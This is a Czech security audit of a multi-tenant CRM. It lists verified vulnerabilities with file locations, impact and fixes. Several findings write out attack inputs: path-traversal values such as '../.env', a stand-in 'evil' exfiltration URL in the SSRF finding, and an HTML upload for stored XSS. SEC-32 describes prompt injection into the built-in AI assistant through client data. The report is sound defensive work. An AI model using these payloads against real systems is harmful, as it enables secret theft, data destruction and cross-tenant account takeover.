# Bezpečnostní audit Felucia CRM — 2026-09-20

**Rozsah:** kód pracovního stromu (větev `servis-refactor` vč. necommitnutých podkladů) + read-only kontrola prod serveru (nginx, ufw, PostgreSQL katalog, práva souborů, `npm audit`). Žádné aktivní útoky, žádné změny.
**Metoda:** 5 paralelních auditních agentů (A vnější povrch, B tenant izolace, C autorizace/tokeny, D vstupy/uploady, E infra/secrety); každý nález **Kritický/Vysoký** ručně ověřen v kódu nebo na serveru hlavní session. Nálezy nižší závažnosti jsou převzaty z reportů agentů bez samostatného ověření (označeno ⚠ tam, kde agent sám uvedl „neověřeno").

## Shrnutí

| Závažnost | Počet | Klíčové |
|---|---|---|
| **Kritická** | 3 | čtení `.env` jako root přes path traversal v logu org; mazání libovolného souboru přes `ZakazkaFoto.url`; stored XSS bez CSP a bez auth přes podklady zakázky |
| **Vysoká** | 10 | login bez rate-limitu; JWT nezneplatní deaktivaci; demo ADMIN login bez hesla; onboarding bez oprávnění (eskalace); cross-tenant FK z těla requestu; pod-routes OP bez `getPerms`; `/uploads` bez orgId a bez auth; puppeteer preview bez hardeningu (SSRF); heslo prod DB v gitu; Next 14 CVE + next-auth/nodemailer |
| Střední | 21 | RLS nekryje dětské tabulky; kolize e-mailů napříč org; nákupní ceny/klienti/servis/nastavení bez oprávnění; ICS/QR tokeny bez odvolání; mobilní obchod ignoruje `obchodCiziOP`; procesy pod rootem; Node 20 EOL; `.env` 644; xlsx bez fixu; prompt injection Dáša … |
| Nízká | 16 | tokeny plaintext v DB, enumerace účtů, CSP `base-uri`, webhook inquiry, audit log mezery, e-mail HTML injection, ufw 8083, logy s tokeny, uploads v gitu … |

**Co je v pořádku (silné stránky):** orgPrisma + RLS na všech 46 tabulkách s `orgId` (fail-closed, role `nanto_app` bez DDL/bypass), jádro zakázek/vyúčtování/skladu/uživatelů důsledně přes `getPerms` + `canAccessZakazka`, mobilní tech API správně scopované, podpisové/sdílené tokeny hashované + šifrované (vzorová implementace), sanitizeHtml + `hardenPdfPage` všude až na jednu výjimku, CSP nonce/strict-dynamic, HSTS/TLS 1.2+/SSH jen klíčem/fail2ban/unattended-upgrades, Postgres jen na loopback se SCRAM, žádná tajemství v kódu ani v PM2 logách, zálohy + offsite funkční.

**Model hrozeb:**
- *Anonym zvenčí:* brute-force loginu (SEC-04), demo ADMIN session (SEC-06), stažení fotek/dokumentů z `/uploads/zakazky` při znalosti URL (SEC-10), XSS odkaz na doméně oběti (SEC-03), Next/nodemailer CVE (SEC-13).
- *Cizí tenant (self-signup org):* SEC-01 (čtení `.env` → `NEXTAUTH_SECRET` → podvržení JWT libovolné org i superadmina = **úplná kompromitace platformy**), SEC-03, SEC-08 (navázání cizích klientů/OP), SEC-10 (dokumenty jiné org při znalosti cesty), SEC-11 (SSRF ze serveru).
- *Uživatel org s nízkou rolí (TECHNIK):* SEC-02 (smazání `.env`/`.next` → výpadek), SEC-07 (eskalace na OBCHODNIK), SEC-09/21–24 (editace nabídek, cen, šablon, čtení celé databáze klientů a marží).
- *Bývalý zaměstnanec:* SEC-05 (session až 30 dní), SEC-20 (mobilní token navždy), SEC-25 (ICS navždy).
- *Lokální/DB přístup:* SEC-12 (heslo DB v gitu), SEC-35 (`.env` 644, dumpy nešifrované), tokeny plaintext (SEC-36).

---

## KRITICKÉ

### SEC-01 · Čtení libovolného souboru na serveru přes `Organization.logo` (path traversal) — ✅ ověřeno
- **Kde:** `app/api/settings/company/route.ts:24-25` (`logo: body.logo || null`, `logoBw` totéž — libovolný string), `lib/quoteRenderer.ts:506-513` (`path.join(process.cwd(), 'public', logoPath)` + `readFileSync` bez guardu).
- **Výstupní kanál:** `app/api/public/podpis/[token]/route.ts:26` vrací `orgLogoDataUrl(...)` jako base64 v JSON (veřejná stránka podpisu — stačí vlastní SOD s podpisovou relací); `app/api/quotes/[id]/preview` (HTML s `<img src="data:…">`); dále `lib/sodRender.ts:43`, `lib/dokumentyChrome.ts`, `lib/objednavkaDokument.ts` (PDF).
- **Dopad:** Admin kteréhokoli tenanta (self-signup) nastaví `logo: "../.env"` a přečte jako root `DATABASE_URL`, `NEXTAUTH_SECRET` (→ podvržení JWT jakékoli org i superadmina), `STRIPE_SECRET_KEY`, `ANTHROPIC_API_KEY`, `CREDENTIALS_ENCRYPTION_KEY` (→ SMTP hesla všech tenantů), `/root/.ssh/*`. Úplná kompromitace.
- **Stav zneužití:** v prod DB 0 org s `..` v `logo`/`logoBw`, 0 audit záznamů s `..` u loga → **bez známek zneužití**.
- **Oprava:** (1) v PATCH company `logo`/`logoBw` z body **nepřijímat** (nastavuje je jen upload route `settings/company/logo`); (2) v `orgLogoDataUrl` po `path.resolve` vynutit `resolved.startsWith(path.join(process.cwd(),'public','uploads') + path.sep)`; (3) tentýž guard jako sdílený helper `safeUploadPath(rel)` v `lib/zakazkaPodklady.ts` použít všude, kde se skládá cesta z DB (viz SEC-02). Rotace `NEXTAUTH_SECRET`/klíčů není nutná (bez stop zneužití), DB heslo rotovat kvůli SEC-12 stejně.

### SEC-02 · Smazání libovolného souboru jako root přes `ZakazkaFoto.url` — ✅ ověřeno
- **Kde:** `app/api/zakazky/[id]/foto/route.ts:21-25` a `app/api/mobile/zakazka/[id]/foto/route.ts:63` (JSON fallback ukládá `body.url` beze změny) → `app/api/mobile/zakazka/[id]/foto/[fotoId]/route.ts:27-28` (`join(process.cwd(),'public', foto.url)` → `unlink`). Podobně `titulni-foto` přijímá libovolný string (jen zobrazuje).
- **Dopad:** Kdokoli s přístupem k zakázce (TECHNIK) vloží `url: "/../.env"` a pak fotku smaže → smazání `.env`, `.next/*`, `ecosystem.config.js`, `/root/backups/*` (procesy běží jako root, SEC-33). Výpadek prod, ztráta záloh.
- **Oprava:** JSON fallback přijímat jen `data:image/(png|jpeg|webp);base64,` s limitem, nebo zrušit (web má multipart); v DELETE povolit jen `url.startsWith('/uploads/zakazky/'+params.id+'/')` + `safeUploadPath`. Stejný guard v `documents/[id]`, `deals/[id]/photos/[photoId]`, `priloha/[typ]` DELETE, `smazatPodkladSoubor`.

### SEC-03 · Stored XSS na doméně oběti přes podklady zakázky (`.html`/`.svg` do veřejného `/uploads`) — ✅ ověřeno
- **Kde:** `lib/zakazkaPodklady.ts:13-31` (zachovává příponu, žádná kontrola typu), `app/api/zakazky/[id]/podklady/route.ts:52-58` (žádný whitelist MIME), `middleware.ts:75-80` (`/uploads/zakazky/*` → `NextResponse.next()` **bez auth a bez CSP**). Next servíruje `public/` s Content-Type podle přípony (ověřeno curl: jen `nosniff` + `X-Robots-Tag`, žádné CSP, žádný `Content-Disposition`).
- **Dopad:** Uživatel s `zakazkyEdit` v org A (trial) nahraje `x.html` se skriptem a pošle odkaz `https://<slug-oběti>.felucia.io/uploads/zakazky/<id>/dok_…html` — cesta je nezávislá na hostu, skript běží v originu oběti a volá `/api/*` s jejími cookies → převzetí účtu v jiném tenantovi, phishing na doméně felucia.io. Sekundárně: `documents/upload`, `deals/[id]/photos`, `company/logo` (SVG), `quote-templates/[id]/logo`, `onboarding/branding` odvozují příponu z `file.name` (auth cesty, tam pravděpodobně chrání CSP z middleware ⚠ neověřeno).
- **Oprava:** (1) whitelist přípon per route + magic bytes (`file-type` / `sharp` / `%PDF-`), příponu vždy z detekovaného typu; (2) v middleware pro celé `/uploads/*` přidat `Content-Security-Policy: default-src 'none'; sandbox` + `Content-Disposition: attachment` pro vše mimo obrázků/PDF; (3) dlouhodobě `/uploads` obsluhovat vlastní route s auth (SEC-10), ne z `public/`.

---

## VYSOKÉ

### SEC-04 · Webové přihlášení bez rate-limitu (brute-force + CPU DoS) — ✅ ověřeno
- **Kde:** `lib/auth.ts:70-92` (`authorize()` nevolá `checkRateLimit`), nginx bez `limit_req`, fail2ban jen jail `sshd`.
- **Dopad:** Neomezené credential stuffing přes `POST /api/auth/callback/credentials`; každý pokus s existujícím e-mailem = bcrypt cost 12 (~300 ms CPU v jediném PM2 procesu) → i DoS. Mobilní login limit má (10/min).
- **Oprava:** v `authorize(credentials, req)` volat `checkRateLimit('login:'+getClientIp(req), 10, 15*60_000)` + per-e-mail klíč; dlouhodobě `limit_req_zone` v nginx pro `/api/auth/`. Pozn.: `lib/rateLimit.ts` je in-memory `Map` — nuluje se restartem (OK při `instances: 1`).

### SEC-05 · JWT session se nezneplatní při deaktivaci uživatele/org, změně hesla ani odebrání superadmina — ✅ ověřeno
- **Kde:** `lib/auth.ts:114-124` — refresh každých 60 s načte `snap.aktivni`, ale použije jen `role/plan/perms`; `organization.aktivni` a `isSuperAdmin` se nečtou vůbec; `maxAge` = 30 dní; `reset-password`/`profile/password` session neruší.
- **Dopad:** Propuštěný zaměstnanec / deaktivovaná org pracuje dál až 30 dní; odebraný superadmin zůstane superadminem. Mobil deaktivaci hlídá (`lib/mobile-auth.ts:41-42`), org ne.
- **Oprava:** v jwt callbacku při `!snap || !snap.aktivni || !snap.orgAktivni` token zneplatnit (`token.invalid = true` → v `session` vrátit null / middleware odmítnout); do `PermsSnapshot` přidat `orgAktivni` + `isSuperAdmin`; přidat `User.sessionVersion` (bump při změně hesla/deaktivaci) a porovnávat.

### SEC-06 · Demo auto-login bez hesla = ADMIN session; write-protection jen na hlavní doméně — ✅ ověřeno
- **Kde:** `lib/auth.ts:29-44` (`credentials.isDemo === 'true'` → login jako `demo@felucia.io`, role ADMIN, org `demo`, plán PROFESSIONAL); `middleware.ts` — demo-blok mutací je až za `isSubdomain` větví, která končí `return nextWithCsp(...)`. Žádná API route `isDemo` nekontroluje.
- **Dopad:** `POST https://cokoliv.felucia.io/api/auth/callback/credentials` s `isDemo=true` → plný ADMIN zápis do demo org: deface demo dat (marketing), e-maily/SMS jménem org, AI tokeny, Stripe zákazníci, zakládání uživatelů.
- **Oprava:** demo-blok přesunout **před** větvení podle hostu (nebo do společného helperu); demo větev v `authorize` vázat na host `felucia.io` + env flag; zvážit `isDemo` kontrolu i v citlivých routes (e-mail, SMS, AI).

### SEC-07 · `/api/onboarding/*` bez oprávnění — TECHNIK si založí OBCHODNIKA a dostane jeho magic link — ✅ ověřeno
- **Kde:** `app/api/onboarding/invite/route.ts:10-13` (jen `if (!session)`), `:56-72` (vytvoří uživatele role OBCHODNIK + magic token 7 dní), `:100` (**`inviteUrl` s tokenem vrací v JSON**). Totéž `company` (IČO/DIČ/název), `branding` (logo bez kontroly typu/velikosti, `primaryColor`), `import` (xlsx → bare prisma, obchází limit produktů), `complete`, `categories`, `template-mode` — bez `getPerms`, bez vazby na `onboardingDone === false`. Nic v audit logu.
- **Dopad:** Eskalace TECHNIK → OBCHODNIK (všichni klienti, OP, nabídky, ceny); přepis identity firmy; DoS přes xlsx (SEC-30).
- **Oprava:** každá onboarding route `getPerms(session.user).nastaveniOrg` (invite: `spravaUzivatelu`) + guard `org.onboardingDone === false`; `inviteUrl` z odpovědi odstranit (jen `emailSent`); `logAction` jako v `settings/users/route.ts:69`.

### SEC-08 · Cross-tenant vazby přes cizí ID v těle requestu (RLS FK kontroly neblokuje) — ✅ ověřeno
- **Kde:** `app/api/servis/kontrakty/route.ts:39-63` (`klientId/dealId/zarizeniId` z body → `prisma.$transaction` = holý owner klient, ani RLS); `app/api/deals/route.ts:74-95` (`clientId` → `db.deal.create` bez ověření; RLS kontroluje jen `deals.orgId`, FK reference RLS obchází — dokumentované chování PG); `app/api/servis/zarizeni/route.ts:39-57` (`klientId/dealId`).
- **Dopad:** Org A založí OP/kontrakt/zařízení nad klientem org B (nutná znalost cuid — unikají v URL, PDF, sdílených odkazech). Detail OP (`app/(dashboard)/deals/[id]/page.tsx:53-56`, holý prisma `include: { client }`) a PDF nabídky zobrazí celý záznam klienta org B; obráceně detail klienta v org B ukáže OP org A. Org B pak nesmaže svého klienta (FK Restrict). V prod dnes 0 cross-org FK.
- **Oprava:** společný helper `assertOwned(db, 'client', id, orgId)` (vzor `app/api/zakazky/route.ts:31-33`, `lib/servisZakazkaService.ts:79-90`) před každým create/update s FK z body; kontrakty vést přes `orgPrisma(orgId).$transaction`. Doplnit test do `tests/rls.test.ts` „create s cizím clientId pod nanto_app projde" (dokumentuje limit vrstvy 2).

### SEC-09 · Pod-routes OP/nabídek nevynucují `obchod`/`obchodCiziOP`; 54 ze 161 mutujících routes bez `getPerms` — ✅ ověřeno
- **Kde:** `dealScopeWhere` jen v `deals/route.ts` a `deals/[id]/route.ts`; **bez** `getPerms`: `deals/[id]/quotes/**` (PATCH/DELETE nabídky, položky, duplicate), `deals/[id]/items/*`, `deals/[id]/activities/*`, `deals/[id]/photos/*`, `deals/[id]/duplicate`, `quotes/[id]/preview|export-pdf`, `leady/[id]/notes`. Middleware blokuje jen stránky `/deals`, ne `/api`.
- **Dopad:** TECHNIK (`obchod=false`) nebo OBCHODNIK bez `obchodCiziOP` přes curl mění/maže nabídky a položky (ceny, slevy) na libovolném OP v org, nahrává fotky, duplikuje OP, stahuje PDF nabídek.
- **Oprava:** helper `canAccessDeal(user, perms, dealId)` (analogie `canAccessZakazka` v `lib/zakazkyHelpers.ts:31`) s `dealScopeWhere`; volat na začátku každé `deals/[id]/**` a `quotes/[id]/**` route; mutace navíc `if (!perms.obchod) return forbidden()`. Zbylé routes bez `getPerms` viz SEC-23/24.

### SEC-10 · `/uploads/*`: auth bez orgId; `/uploads/zakazky|predavaky/*` zcela bez auth (nově i PDF podklady) — ✅ ověřeno
- **Kde:** `middleware.ts:75-84` (zakazky/predavaky → `next()` bez tokenu; ostatní jen `getToken`, cesta se neporovnává s `token.orgId`); `lib/zakazkaPodklady.ts` (necommitnuté — dokumenty až 25 MB pod `public/uploads/zakazky/<id>/dok_<ts>_<název>`); `scripts/migrate-podklady-to-disk.ts` přesune všechny existující podklady z DB na disk.
- **Dopad:** Kdokoli s URL (log proxy, historie prohlížeče, přeposlaný odkaz, nginx access log) stáhne fotky z domácností klientů, podpisy a nově smlouvy/projektovou dokumentaci bez přihlášení; po deaktivaci uživatele nelze odříznout. Název = `Date.now()` ms → při známém zakazkaId brute-forcovatelný. Přihlášený uživatel org A stáhne `/uploads/<orgB>/documents/*`, `/uploads/org/<orgB>/priloha-vop.pdf`, loga, avatary, pokud zná cestu. `/uploads/predavaky/` se v kódu nepoužívá (mrtvý veřejný prefix).
- **Oprava:** servírovat přes route handler `app/uploads/[...path]/route.ts` (soubory mimo `public/`), s `canAccessZakazka`/orgId kontrolou, session **nebo** mobilní Bearer (RN `Image` umí `headers`), případně krátkodobě podepsané URL (vzor `lib/calendarToken.ts` HMAC). Odstranit `/uploads/predavaky/` z výjimky. **Před nasazením `migrate-podklady-to-disk.ts` tohle vyřešit.**

### SEC-11 · Náhled šablony nabídky: puppeteer bez `hardenPdfPage()` + neescapované placeholdery → SSRF/exfiltrace ze serveru — ✅ ověřeno
- **Kde:** `app/api/settings/quote-templates/[id]/preview/route.ts:47-53` (`puppeteer.launch` + `page.setContent(html, { waitUntil: 'networkidle0' })` — jediné místo bez hardeningu; JS i síť zapnuté); `lib/quoteRenderer.ts:764` a `lib/quoteHtml.ts` dosazují `{{klient_jmeno}}` apod. **po** sanitizaci bez `escHtml()`. Route jen `if (!session)`, bez `nastaveniOrg`/plánu.
- **Dopad:** Obchodník zadá jméno klienta `<img src="http://127.0.0.1:3000/api/…">` / `<style>…url(https://evil/?x=…)</style>` → blind SSRF na interní síť (Postgres port, Next API bez auth hlaviček), exfiltrace obsahu; navíc kdokoli může posílat libovolné `htmlContent` do puppeteeru (CPU).
- **Oprava:** `hardenPdfPage(page)` (nebo `generatePdf`), `escHtml()` na všechny dosazované hodnoty (jako už `polozka_*`), `htmlContent` přes `sanitizeFullDocumentHtml`, route gate `nastaveniOrg` + `hasCustomHtml`.

### SEC-12 · Heslo prod DB (role `nanto`, owner bez RLS) commitnuté v `.claude/settings.local.json` — ✅ ověřeno
- **Kde:** `.claude/settings.local.json` (tracked, v historii od `dfea21b` initial commit 2026-06-11; 2 výskyty `postgresql://…`), heslo se shoduje s `DATABASE_URL` v `.env`. Ostatní tajemství v historii **nejsou** (0 hitů).
- **Dopad:** Postgres poslouchá jen na loopback → zneužití vyžaduje shell; ale repo dnes nemá remote — jakmile se pushne nebo sdílí klon, heslo uniká.
- **Oprava:** `ALTER ROLE nanto PASSWORD …` + `.env` + deploy; `git rm --cached .claude/settings.local.json` + `.gitignore`; před prvním pushem `git filter-repo --path .claude/settings.local.json --invert-paths`.

### SEC-13 · Závislosti: Next 14.2.35 bez patchů (2 critical), next-auth 4.24.13 (fix 4.24.15), nodemailer 7 (CRLF injection), xlsx bez fixu — ✅ ověřeno (`npm audit`: 2 critical / 34 high / 40 moderate)
- **next:** fix jen major (15.5.24+/16.x): RSC cache poisoning, XSS v App Routeru **s CSP nonces** (GHSA-ffhc-5mcf-pf4q), DoS Server Actions, SSRF přes WebSocket upgrade, request smuggling v rewrites, Image Optimizer (AVIF RCE `<15.5.24` ⚠ zda zasahuje 14.2.x bez `remotePatterns` neověřeno; `/_next/image` je mimo middleware a odpovídá bez auth). CVE-2025-29927 opravena.
- **next-auth 4.24.13 → 4.24.15** (bez majoru): `getToken()` crash na malformed Bearer (relevantní pro middleware upload auth), homoglyph e-mail bypass.
- **nodemailer 7.0.13 → 10.x** (major): SMTP command injection, CRLF v List-* hlavičkách, addressparser ReDoS — vstup pro adresy je od uživatelů.
- **xlsx 0.18.5:** prototype pollution + ReDoS, na npm bez fixu (SEC-30). **dompurify 3.4.9 → 3.4.15**, **sanitize-html 2.17.5 → 2.17.7** (mXSS bypass přes `</textarea/>`, SVG SMIL — používáte pro tenant HTML), **@tiptap/core** (XSS přes `__proto__`), **puppeteer → 24.43.1**, **html-to-docx** (image-size DoS; DOCX export je stejně kandidát na zrušení).
- **Oprava:** (1) hned `images: { unoptimized: true }` v `next.config.mjs` (next/image se nepoužívá) nebo nginx `location /_next/image { return 404; }`; (2) `npm i next-auth@4.24.15 dompurify@latest sanitize-html@latest @tiptap/core@latest @tiptap/react@latest puppeteer@24.43.1` + `npm audit fix` (bez `--force`) v e2e prostředí → `deploy.sh`; (3) xlsx z `cdn.sheetjs.com` 0.20.x nebo exceljs; (4) nodemailer 10; (5) plán upgradu Next 15.5 (LTS).

---

## STŘEDNÍ

### SEC-14 · Expirovaný cert `crm.workspace-nanto.cz` (16. 6. 2026) je default server pro neznámý Host na 443 — ✅ ověřeno
`/etc/nginx/sites-available/nanto-crm` první `listen 443` blok; `certbot certificates` zná jen felucia.io (renewal conf `.disabled`). Přístup na https://IP/ nebo cizí Host dostane expirovaný cert a je proxynut do Next. **Oprava:** explicitní `server { listen 443 ssl default_server; server_name _; ssl_certificate …felucia.io…; return 444; }` + `listen 80 default_server; return 444;`; crm cert obnovit po vyřešení DNS (viz paměť `project_dns_crm_nanto_domain`) nebo blok vypnout.

### SEC-15 · `productId` u položek nabídky / `templateId` u nabídky se ukládají bez ověření org
`app/api/deals/[id]/items/route.ts:25-30`, `deals/[id]/quotes/[quoteId]/items/route.ts:33-39,66-74`, `deals/[id]/quotes/[quoteId]/route.ts:31`. `loadProductSnapshots` je org-scoped (vrátí prázdno), ale FK se zapíše; detail OP (holý prisma, `include: { product }`) pak zobrazí produkt cizí org vč. `nakladovaCena`, renderer použije HTML šablonu cizí org. **Oprava:** `if (productId && !product) return 400`; `templateId` ověřit jako `lib/sodCreate.ts:44-46`.

### SEC-16 · 13 dětských tabulek bez `orgId` nemá RLS; `organizations` bez RLS a `nanto_app` má na ni UPDATE/DELETE
Prod: `activities, cenik_polozky, lead_notes, predavak_fotky, predavak_polozky, quote_items, quote_template_configs, quote_template_htmls, technik_zakazky, vyuctovani_polozky, zakazka_fotky, zakazka_komentare, zakazka_polozky, _ProductCategories` — `relrowsecurity = f`, plné DML pro `nanto_app`. Všechna nalezená volání mají relační filtr, ale jedna zapomenutá route = cross-tenant. `db.organization.update({ where: { id: <cokoliv> } })` projde. **Oprava:** rozšířit `scripts/generate-rls-sql.ts` o policy `EXISTS (SELECT 1 FROM deals d WHERE d.id = "dealId" AND d."orgId" = current_setting('app.org_id', true))` pro každý child model; `organizations` policy `id = app.org_id`; `system_settings` jen SELECT; tokeny přes `EXISTS users`. Přegenerovat, aplikovat na test DB i prod.

### SEC-17 · Kolize e-mailů napříč org: login/forgot/magic-link `findFirst({ email })` bez orgId
`lib/auth.ts:73-76`, `auth/forgot-password/route.ts:19`, `auth/magic-link/route.ts:19`; `User @@unique([orgId, email])` — admin org B může založit uživatele s e-mailem admina org A. Web login vezme nedeterministický záznam → oběti přestane fungovat login (DoS), magic-link ji přihlásí do útočníkovy org. Převzetí účtu ne. V prod 0 duplicit. **Oprava:** iterovat kandidáty jako `auth/mobile/login/route.ts:41-55`, nebo login vázat na `x-tenant-slug`; forgot/magic-link poslat pro všechny shody.

### SEC-18 · Prisma filter injection + timing oracle ve forgot-password / magic-link
`const { email } = await req.json()` → `findFirst({ where: { email } })` přijme objekt `{ "startsWith": "a" }`; při shodě `await` INSERT + SMTP (stovky ms) vs. okamžitý 200. Enumerace e-mailů po znacích + spam resetů. **Oprava:** `if (typeof email !== 'string') return 400` (i register), odeslání e-mailu přes worker (konstantní odpověď).

### SEC-19 · Impersonace: akce se v audit logu připisují impersonovanému adminovi; cookie plain JSON; DELETE bez session
`lib/auth.ts:142-181` (session callback přepíše `session.user.id`), `app/api/superadmin/impersonate/route.ts:37-50, 73-101`; `logAction` nikde nezaznamená impersonátora; `impersonatingUserId` se neověřuje vůči `orgId`; DELETE zapíše `IMPERSONATE_END` bez session. **Oprava:** `session.user.impersonatorId` + `logAction` ho ukládat; cookie podepsat (`lib/secretCrypto.ts`) nebo držet v DB; DELETE přes `getToken` + `isSuperAdmin`.

### SEC-20 · Mobilní token 30 dní, „refresh" prodlužuje donekonečna, žádná revokace/rotace
`auth/mobile/login/route.ts:63-75`, `mobile/refresh/route.ts:19-57`: není refresh token, žádné `jti`, logout nic neruší, změna hesla token nezneplatní; jediná brzda `aktivni` (≤60 s). **Oprava:** access 1 h + refresh token hashovaný v DB (rotace, revokace); `typ:'mobile'`/`aud` v JWT (sdílený `NEXTAUTH_SECRET` i pro QR tokeny zařízení); `User.sessionVersion` (viz SEC-05).

### SEC-21 · Nákupní ceny/marže unikají uživatelům bez `financeNakupky`
`GET /api/deals/[id]/quotes` (`items` s `nakupniCena` + `product: true` vč. `nakladovaCena`), `mobile/obchod/nabidka/[id]`, `mobile/obchod/produkty`, `search` — UI filtruje, API ne (komentář v mobile kódu to přiznává). Souvisí s paměťovou poznámkou „OBCHODNIK nevidí marže". **Oprava:** vzor `zakazky/[id]/polozky/route.ts:25-26` — `nakupniCena: perms.financeNakupky ? … : null`, `product` explicitní `select`.

### SEC-22 · Kompletní databáze klientů + fulltext dostupné každému přihlášenému (vč. TECHNIK)
`clients/route.ts:9-20` GET, `clients/[id]/route.ts:7-13`, `search/route.ts:18-31` — jen session; `obchod` až pro POST/PATCH. GDPR/obchodní riziko při odchodu technika. **Oprava:** bez `obchod` omezit na klienty z jeho zakázek (`client: { zakazky: { some: zakazkyScopeWhere } }`).

### SEC-23 · Servisní modul: mutace jen s kontrolou plánu, bez `servis`/`servisDispecink`
`servis/zakazky/[id]/vyuctovat`, `reklamace`, `polozky` (PUT), `fotky` (POST/DELETE), `servis/kontrakty` + `[id]`, `servis/zarizeni` + `[id]`, `servis/zakazky/reaktivni` — jen `hasServiceModule`. Správně jen `servis/zakazky/route.ts` a `[id]/route.ts`. **Oprava:** `servisScopeWhere` + `canAccessServisniZakazka` (`lib/mobile-helpers.ts:96`), kontrakty/zařízení gate `perms.servisDispecink`.

### SEC-24 · Nastavení org editovatelné bez `nastaveniOrg`
`contract-templates/**` (POST/PATCH/DELETE/import), `categories/**`, `ceniky/[id]/polozky/**`, `settings/quote-templates` POST + `[id]/preview`, `products` POST + `[id]` PATCH (DELETE správně), `documents/upload`, `documents/[id]` DELETE — jen `if (!session)`. TECHNIK smaže smluvní šablonu, přepíše prodejní cenu, smaže dokument org. **Oprava:** jednotně `if (!getPerms(session.user).nastaveniOrg) return forbidden()`; produkty `nastaveniOrg || obchod`.

### SEC-25 · ICS kalendářový token: deterministický HMAC, bez expirace/odvolání, ignoruje `aktivni` i perms
`lib/calendarToken.ts:3-9` (`HMAC(NEXTAUTH_SECRET, "cal:"+userId)[0:32]`), `calendar/ics/route.ts:60-120` vrací **všechny** OP org, aktivity s kontakty klientů, servisní návštěvy. Bývalý zaměstnanec čte navždy; nelze zneplatnit bez rotace `NEXTAUTH_SECRET`. **Oprava:** per-user náhodný `calendarToken` v DB (hash) + endpoint regenerace; v route `aktivni: true` + `dealScopeWhere`/`zakazkyScopeWhere`.

### SEC-26 · Veřejná QR stránka zařízení odhaluje PII klienta; JWT 10 let plaintext v DB, bez odvolání a rate-limitu
`servis/zarizeni/[id]/qr-token/route.ts:24-27`, `app/zarizeni/[token]/page.tsx:45-66,158-184` — jméno, adresa (mapy), telefon, e-mail klienta, kontrakt, 5 servisních zakázek s technikem. Kdokoli vyfotí nálepku na jednotce. 3 zařízení v prod už token mají. **Oprava:** veřejně jen zařízení + kontakt na servis org; PII po přihlášení; rotace/DELETE tokenu; `checkRateLimit`.

### SEC-27 · Rate-limit veřejných podpisových/nabídkových endpointů jde obejít spoofem `X-Forwarded-For`
`public/podpis/[token]/route.ts:14`, `otp:12`, `overit:11`, `podepsat:18`, `pdf:9`, `app/nabidka/[token]/route.ts:25` — `x-forwarded-for.split(',')[0]` (přesně vzor, před kterým varuje `lib/rateLimit.ts:48-55`). OTP SMS náklady, Puppeteer PDF DoS; per-relace limity (`otpPokusy ≤ 5`) drží. **Oprava:** `getClientIp(req)` z `lib/rateLimit.ts:57`.

### SEC-28 · Mobilní obchod (Felucia Sales) ignoruje `obchodCiziOP`
`mobile/obchod/pripady/route.ts:24-30` (`moje` = parametr z klienta), `pripady/[id]`, `nabidka/[id]`, `sod/[id]`, `zamereni/[id]`, `aktivity` — `where: { id }` bez `dealScopeWhere`. **Oprava:** `...dealScopeWhere(perms, userId)` do všech `where`.

### SEC-29 · Servisní přílohy (VOP/VZSP/ceník): jen Content-Type, bez limitu, pak `pdfunite` + Chromium `--no-sandbox` jako root
`settings/company/priloha/[typ]/route.ts:32-44`, `lib/mergePdfs.ts:23`, `lib/sodPdf.ts:84`. **Oprava:** `%PDF-` hlavička + limit ~10 MB; procesy pod neprivilegovaným userem (SEC-33).

### SEC-30 · `onboarding/import`: xlsx 0.18.5 (ReDoS, prototype pollution) na libovolně velkém uploadu od kohokoli se session
Single PM2 instance → DoS pro všechny tenanty. Klientský `ImportWizard.tsx` parsuje v prohlížeči (self-harm). **Oprava:** viz SEC-07 (perms) + limit 5 MB + parsovat jen na klientovi (jako import-products) nebo xlsx z cdn.sheetjs.com 0.20.x.

### SEC-31 · CSV export audit logu — formula injection
`settings/audit-log/export/route.ts:22-30` — `zaznamNazev` jen v uvozovkách, `user.jmeno`/`typAkce` neobalené; `=HYPERLINK(...)` Excel vyhodnotí. **Oprava:** prefix `'` u buněk začínajících `= + - @ \t \r`, quote každé pole.

### SEC-32 · Prompt injection do Dáši z dat klientů → automatické zápisové akce
`ai-assistant/route.ts:118-135, 264-282`, `lib/dasaTools.ts` — tool výsledky (poznámky, názvy z leadů z veřejného formuláře) bez ohrazení; system prompt „proveď bez ptaní" pro `add_activity`, `change_deal_status`, `create_quote`; klient řídí `history` (i role `assistant`) a `context.*` v system promptu; `message` bez limitu. Tenant izolace a perms v nástrojích jsou OK. **Oprava:** tool výsledky obalit `<data>` s instrukcí; zápisové nástroje vyžadovat `confirm: true` z UI; `history` validovat; `context` jen ID; limit `message` ~4 kB.

### SEC-33 · Vše běží pod rootem (Next, worker, PM2, Chromium bez sandboxu)
`ps` → `root next-server`, `root tsx worker/index.ts`, `pm2-root.service`. Jakákoli RCE (SEC-13, SEC-29, SEC-30) = root na celém VPS vč. DB, záloh, B2, SSH. **Oprava:** user `nanto` (nologin), `chown -R`, `.env` 640 root:nanto, `pm2 startup systemd -u nanto`.

### SEC-34 · Node.js 20.20.2 po EOL (30. 4. 2026)
Bez patchů runtime (OpenSSL, HTTP parser, undici). **Oprava:** Node 22 LTS (Next 14.2 podporuje), `pm2 update`, deploy.

### SEC-35 · `.env` 644 (i kopie `/var/tmp/felucia-e2e/.env` se `sk_live` klíčem), zálohy nešifrované (`/root/backups` 755, dumpy 644, B2 remote bez `crypt`)
Dnes na serveru jen root a postgres → omezený dopad; každý budoucí účet/escape to přečte. **Oprava:** `chmod 600` obou `.env`; `chmod 700 /root/backups`; `backup-db.sh` přes `age`/`gpg --symmetric` nebo rclone `crypt` remote; v e2e kopii testovací Stripe klíč.

---

## NÍZKÉ

- **SEC-36** Reset/magic-link/pozvánkové tokeny v DB plaintext (na rozdíl od `SodPodpisRelace.tokenHash`, `Quote.shareTokenHash`); předchozí tokeny se nezneplatňují; `reset-password` nekontroluje `aktivni`. → `sha256(token)` jako `lib/quoteShare.ts:14`, mazat staré při vydání nového.
- **SEC-37** Enumerace účtů: register 409 „email je již registrován", timing v loginu (bez bcrypt pro neexistující e-mail), `check-slug` bez rate-limitu prozrazuje slugy tenantů. → dummy `bcrypt.compare`, RL na check-slug, 409 sjednotit.
- **SEC-38** Register: `rawSlug` z klienta bez sanitizace (`auth/register/route.ts:41` — tečky, velká písmena → nedosažitelná subdoména; `FORBIDDEN_SLUGS` bez `crm`, `support`…), e-mail bez normalizace, heslo jen `length >= 8`. → stejná normalizace jako check-slug + `/^[a-z0-9-]{3,30}$/`, lowercase e-mail, heslo ≥ 10.
